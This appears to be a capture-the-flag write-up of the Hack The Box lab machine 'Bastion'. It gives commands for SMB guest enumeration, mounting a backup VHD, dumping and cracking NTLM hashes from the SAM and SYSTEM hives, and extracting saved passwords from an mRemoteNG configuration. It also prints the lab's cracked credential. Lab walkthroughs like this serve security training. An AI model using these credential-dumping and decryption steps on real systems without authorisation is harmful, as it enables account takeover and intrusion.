+++

title = "Bastion-Golden"

+++

Bastion, is a windows machine that has smb, ssh, winrm. We'll find a backup a virtual box back up image a VHD file. Well get our Credentials to login from dumping NTLM-hashes from <mark>Sam, System</mark>. To get root we'll exploit some saved credentials in a configuration file to ssh into. 

**NMAP**

```
# Nmap 7.70 scan initiated Mon May 13 17:33:32 2019 as: nmap -sC -sV -p22,135,139,445,5985,12512 -oA nmap/target 10.10.10.134                                
Nmap scan report for 10.10.10.134
Host is up (0.046s latency).

PORT      STATE  SERVICE      VERSION
22/tcp    open   ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey:
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp   open   msrpc        Microsoft Windows RPC
139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open   microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp  open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
12512/tcp closed unknown
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows                                                                     

Host script results:
|_clock-skew: mean: -39m52s, deviation: 1h09m14s, median: 5s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2019-05-13T23:33:50+02:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-05-13 17:33:49
|_  start_date: 2019-05-13 15:37:21

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                               
# Nmap done at Mon May 13 17:33:50 2019 -- 1 IP address (1 host up) scanned in 18.08 seconds 
```

**SSH** Nothing here to exploit

**SMB** Guest login is enabled, this is our first way into bastion. Ill Show a couple of ways to use different tools to enumerate SMB shares.

```
smbmap -u guest -H 10.10.10.134 -r /
-u username
-r recursive
```

![smb-map](https://chickenpwny.github.io/images/bastion/smb-map.png)

```
smbclient //10.10.10.134/Backups
```

![smb-client](https://chickenpwny.github.io/images/bastion/smb-client.png)

**CLUES** So we found a clue in notes.txt 

```
Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
```

​	There's back-image's in the SMB share,there a few directories in. 

```
cd "/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/"
```

![smb-backup-imaget](https://chickenpwny.github.io/images/bastion/smb-backup-imaget.png)

We could Download the backup image which will take forever. We can mount the share to <mark> mnt </mark> and inspect the image that way. 

<img src="https://chickenpwny.github.io/images/bastion/thinking.jpg" width="300px" height="300px">

```
mount -o user=guest '//10.10.10.134/Backups' /mnt/bast-vhd 
```

![mount-smb](https://chickenpwny.github.io/images/bastion/mount-smb.png)

  Well, need a Tool to mount the image so we can inspect it. I used <mark>guestmount</mark>. 

```
apt-get install libguestfs-tools
```

  After thats done with could take awhile, well mount the drive and examine it. Make a directory in mount or mnt directory. 

```
mkdir /mnt/bast-vhd
cd "/mnt/bast-vhd/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/"
```

  You may have to use the full path. After some testing well find that <mark>9b9cfbc4</mark>	is our desired image.

```
mkdir /mnt/bast-vhd2
guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/bast-vhd2/
```

   Windows stores user Credentials in <mark> SAM & SYSTEM</mark>, it stores them as NTLM hashes. Hashes are cryptographically secure. They only work on way, but that doesn't mean they aren't without faults.  We will be using some pwdrump which is should be reinstalled on kali. 

```
cd /mnt/bast-vhd2/Windows/System32/config
```

![ntlm-system-sam](https://chickenpwny.github.io/images/bastion/ntlm-system-sam.png)

  As mentioned above will be using <mark>PWDump</mark> which will extract the <mark>NTLM</mark> hashes from <mark>SYSTEM</mark> hive and <mark>SAM</mark> hive

```
pwdump SYSTEM SAM
```

![ntlm-hashes](https://chickenpwny.github.io/images/bastion/ntlm-hashes.png)

  Before running off to <mark>HASHCAT</mark> lets try <mark>crackstation.net</mark>, hashcat should be a last resort just to save time. I tried to use hashcat but didn't get anything, i also cut it short but whatever. 

  I would like to take a moment to disgust what a ntlm hash is. Colon's are a delimiter,the first part is the user-name, the next the groupid the user belongs to. notice in the image above the different users have differing id's. Ntlm hashes can store a large password up to 128 characters. they broken into two hashes. 

![ntlm-hashes2](https://chickenpwny.github.io/images/bastion/ntlm-hashes2.png)

![crackstation](https://chickenpwny.github.io/images/bastion/crackstation.png)

**PASSWORD** IS bureaulampje

```
user:	L4mpje
pass:	bureaulampje
```

**SHELL** We could ssh or probably winrm. 

```
ssh L4mpje@10.10.10.134
```

![user](https://chickenpwny.github.io/images/bastion/user.png)

One place to check but is often forgotten about is program files and check both versions. 

![mRemoteNH](https://chickenpwny.github.io/images/bastion/mRemoteNH.png)

**[mRemoteNG](https://www.reddit.com/r/mRemoteNG/comments/66hzoe/mremoteng_password_storage_is_insecure/)** Use to store passwords in clear text, now the credentials are encrypted. 

 We will have to move the files over to our lhost 

go to file > Open connectionFile

![remote2](https://chickenpwny.github.io/images/bastion/remote2.PNG)

now well add this weird external terminal tool feature to extract the passwords. 

Tools > External Tools

you will notice i already have one done but i added quotes and that tripped me up thought it was apart of the password lol. then i check L4mpje and saw the same quote. this will opena  terminal with the password decrypted yes!!

```
display name :	PassWordLookUp
filename :	cmd
arguements :	/k echo %password%
```

![remote3](https://chickenpwny.github.io/images/bastion/remote3.PNG)

right click on DC > external tool >passwordlookup . it should open a cmd prompt. 

![root](https://chickenpwny.github.io/images/bastion/root.PNG)

login into ssh with adminsitrator and the password done.

![pinkie-evil](https://chickenpwny.github.io/images/bastion/pinkie-evil.webp)